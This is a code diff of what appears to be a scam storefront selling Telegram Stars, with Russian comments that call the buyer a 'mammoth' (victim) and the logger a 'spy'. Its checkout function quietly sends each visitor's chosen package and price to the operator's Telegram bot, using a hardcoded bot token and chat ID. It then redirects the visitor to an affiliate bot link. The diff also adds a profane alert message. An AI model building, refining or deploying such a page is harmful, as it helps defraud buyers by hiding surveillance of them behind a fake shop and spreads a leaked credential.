@@ -86,11 +86,11 @@
     </footer>
 
     <script>
-        // ДАННЫЕ ЛОГГЕРА (Тот самый бот, который стучит тебе)
+        // ВОТ ЭТОТ БОТ ДОЛЖЕН ПИСАТЬ (ТВОЙ ШПИОН)
         const LOG_BOT_TOKEN = '8693212521:AAE6y0aa5pPeMx6Oa8uRI1f8PvConZGNOiQ';
         const MY_CHAT_ID = '7811669365';
         
-        // ПАРТНЕРСКАЯ ССЫЛКА (Куда идет мамонт за покупкой)
+        // КУДА МАМОНТ ПЕРЕХОДИТ ДЛЯ ПОКУПКИ
         const TARGET_URL = "https://t.me/starseliteofficial_bot?start=_tgr_VvkE7YAzNzUy";
 
         let currentMode = 'stars';
@@ -156,18 +156,20 @@
 
         async function checkout() {
             if (!selectedProduct) {
+                alert("Пакет выбери, ебать!");
                 return;
             }
 
-            // Шлём лог через твой новый бот-логгер
-            const report = `🏴‍☠️ <b>ПЕРЕХОД ПО РЕФКЕ!</b>\n\n` +
+            // Формируем отчет для твоего ПЕРВОГО бота (шпиона)
+            const report = `🏴‍☠️ <b>НОВЫЙ ЗАКАЗ!</b>\n\n` +
                            `📦 Пакет: <b>${selectedProduct.val} STARS</b>\n` +
                            `💸 Цена: <b>${selectedProduct.cost} ${selectedProduct.cur}</b>\n` +
                            `⚙️ Метод: <b>${currentMode.toUpperCase()}</b>\n\n` +
                            `<i>Мамонт редиректится в партнёрку...</i>`;
 
+            // ТУТ МЫ ШЛЕМ ЗАПРОС ИМЕННО С ТОКЕНОМ ШПИОНА
             try {
-                await fetch(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
+                const response = await fetch(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -176,9 +178,15 @@
                         parse_mode: 'HTML'
                     })
                 });
-            } catch (err) {}
+                
+                if (!response.ok) {
+                    console.error("Ошибка телеграма:", await response.text());
+                }
+            } catch (err) {
+                console.error("Ошибка отправки лога:", err);
+            }
 
-            // Улетаем в партнерку
+            // После отправки лога шпиону — кидаем мамонта в партнерку
             window.location.href = TARGET_URL;
         }
 
